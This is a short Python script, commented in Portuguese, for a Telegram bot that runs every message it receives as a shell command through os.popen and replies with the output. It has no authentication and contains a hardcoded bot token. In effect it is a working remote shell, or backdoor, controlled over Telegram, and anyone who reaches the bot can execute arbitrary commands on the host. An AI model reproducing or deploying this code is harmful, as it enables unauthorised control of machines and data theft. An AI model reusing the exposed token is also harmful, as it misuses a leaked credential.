import telebot
import os

# Token do seu bot
TOKEN = "7919510677:AAGU6d685TI7yKbhQ3MfnqImoLi7KrRZ7do"

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "🧠 Ponte ativa. Envie comandos para o sistema.")

@bot.message_handler(func=lambda message: True)
def execute_command(message):
    try:
        cmd = message.text
        output = os.popen(cmd).read()
        if not output:
            output = "Comando executado sem saída."
        bot.reply_to(message, f"✅ Saída:\n{output}")
    except Exception as e:
        bot.reply_to(message, f"❌ Erro:\n{str(e)}")

bot.polling()
